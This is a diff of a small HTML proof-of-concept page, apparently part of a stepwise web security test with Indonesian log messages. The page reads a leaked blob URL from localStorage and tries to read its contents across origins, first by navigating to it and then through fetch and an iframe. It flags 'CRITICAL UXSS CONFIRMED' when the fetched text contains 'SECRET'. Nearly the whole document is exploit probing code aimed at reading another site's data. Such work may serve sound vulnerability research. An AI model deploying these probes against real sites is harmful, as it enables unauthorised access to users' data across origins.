@@ -1,43 +1,32 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Blob Navigation Test - 0x403for</title>
-</head>
+<head><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Blob Inheritance Test</title></head>
 <body style="background:#111;color:#0f0;font-family:monospace;padding:15px">
-<h2>STEP 2 - Test di 0x403for (Direct Navigation)</h2>
+<h2>STEP 2 - Test di 0x403for</h2>
 <pre id=log></pre>
-<button onclick="checkLeak()" style="padding:14px;width:100%;background:#0f0;color:#000;font-weight:bold;cursor:pointer">1. Check localStorage leak</button>
-<button onclick="tryDirectNavigate()" style="padding:14px;width:100%;background:#0f0;color:#000;font-weight:bold;margin-top:6px;cursor:pointer">2. NAVIGATE to blob:</button>
-
+<button onclick="checkLeak()" style="padding:14px;width:100%;background:#0f0">1. Check localStorage leak</button>
+<button onclick="tryFetchBlob()" style="padding:14px;width:100%;background:#0f0;margin-top:6px">2. TRY FETCH blob: dari aqua.network</button>
+<button onclick="tryIframeBlob()" style="padding:14px;width:100%;background:#0f0;margin-top:6px">3. TRY IFRAME blob:</button>
+<iframe id=frame style="width:100%;height:200px;background:white"></iframe>
 <script>
-function log(t){
-  let logEl = document.getElementById('log');
-  logEl.textContent += '[' + new Date().toLocaleTimeString() + '] ' + t + '\n';
-}
-
+function log(t){document.getElementById('log').textContent+=t+'\n'}
 function checkLeak(){
-  let b = localStorage.getItem('aqua_blob_url');
-  if(!b) {
-    log('[-] localStorage: aqua_blob_url tidak ditemukan.');
-  } else {
-    log('[+] Leak ditemukan: ' + b);
-  }
+  let b=localStorage.getItem('aqua_blob_url');
+  log('Leak: '+b);
 }
-
-function tryDirectNavigate(){
-  let blobUrl = localStorage.getItem('aqua_blob_url');
-  if(!blobUrl){
-    log('[-] Abort: Jalankan langkah 1 terlebih dahulu.');
-    return;
-  }
-  
-  log('[*] Mengarahkan halaman ke blob URL...');
-  try {
-    window.location.href = blobUrl;
-  } catch(e) {
-    log('[-] ERROR: ' + e.message);
-  }
+async function tryFetchBlob(){
+  let blobUrl=localStorage.getItem('aqua_blob_url');
+  try{
+    let res=await fetch(blobUrl);
+    let text=await res.text();
+    log('FETCH SUCCESS: '+text.substring(0,200));
+    if(text.includes('SECRET')) log('>>> CRITICAL UXSS CONFIRMED');
+  }catch(e){log('BLOCKED: '+e.message)}
+}
+function tryIframeBlob(){
+  let blobUrl=localStorage.getItem('aqua_blob_url');
+  document.getElementById('frame').src=blobUrl;
 }
 </script>
 </body>
